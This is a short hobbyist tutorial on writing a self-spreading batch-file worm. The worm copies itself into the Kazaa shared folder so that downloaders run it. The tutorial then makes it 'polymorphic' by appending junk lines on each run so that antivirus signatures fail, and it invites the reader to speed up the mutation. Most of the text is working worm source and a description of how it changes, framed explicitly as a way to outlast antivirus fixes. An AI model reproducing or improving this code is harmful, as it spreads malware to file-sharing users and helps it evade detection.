I will start out with a little source code. I know it's batch, and I know it's lame, but it's just an example.


----cut here----
@echo off
if exist C:\progra~1\kazaa\myshar~1\example.bat goto line
echo this example is for educational use only
copy %0 C:\progra~1\kazaa\myshar~1\example.bat
echo worming

It's a very simple code of a program that would (in theory) worm through kazaa and infect a couple of computers. Here's what an anti-virus company would do.

1) The anti-virus company get's a couple of reports of a worm going through kazaa
2) The anti-virus company get's hold of a copy of the worm
3) The anti-virus company examines the worm and coms up with a solution, based on size, code, files and some other stuff
4) The anti-virus company spreads the solution to the clients which dont have any trouble from the worm anymore

So, let's say the code above would make a big hit and infect thousands of computers (which it won't), within a day there will be a fix for it, decreasing the chance it will survive in the wild.

Now let's modify the code above.

@echo off
if exist C:\progra~1\kazaa\myshar~1\example.bat goto line
echo this example is for educational use only
copy %0 C:\progra~1\kazaa\myshar~1\example.bat
echo echo just spam >> C:\progra~1\kazaa\myshar~1\example.bat
echo cls >> C:\progra~1\kazaa\myshar~1\example.bat
echo worming
goto end
cls

:line
del C:\backup.bat
copy %0 C:\backup.bat
start C:\backup.bat
del C:\progra~1\kazaa\myshar~1\example.bat
:end
cls

We have just made our batch worm polymorphic. Every time it is executed, it will either:

1) Copy itself to the kazaa folder, add some useless lines and spread itself from kazaa or
2) When a victim has downloaded it from kazaa, back the file up, delete the original virus file and move to step 1

So: the virus will look like this after two times of running

After 1st time running, sample from the kazaa folder
----cut here----
<virus code>
echo just spam
cls
----cut here----

After 2nd time running, sample from the kazaa folder
----cut here----
<virus code>
echo just spam
cls
echo just spam
cls
----cut here----

Now, When the virus adds 2 lines everytime it runs, it will take about 10 !?!?!? times to increase the file size with 1KB, so that would need a little bit of speeding up (which you will have to do yourself!).
